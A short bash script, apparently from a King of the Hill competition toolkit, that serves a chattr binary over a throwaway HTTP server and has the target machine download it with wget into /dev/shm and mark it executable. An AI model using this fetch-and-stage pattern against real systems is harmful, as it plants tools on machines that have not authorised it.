#!/bin/bash

source "/root/git/koth/scripts/functions.sh"

PORT=$(($RANDOM+3000))
TMPDIR=$(mktemp -d)

hide_guake

cp /root/git/koth/binaries/chattr $TMPDIR
cd $TMPDIR

python3 -m http.server $PORT &
command "wget $IP:$PORT/chattr -O /dev/shm/chattr"
command "chmod +x /dev/shm/chattr"
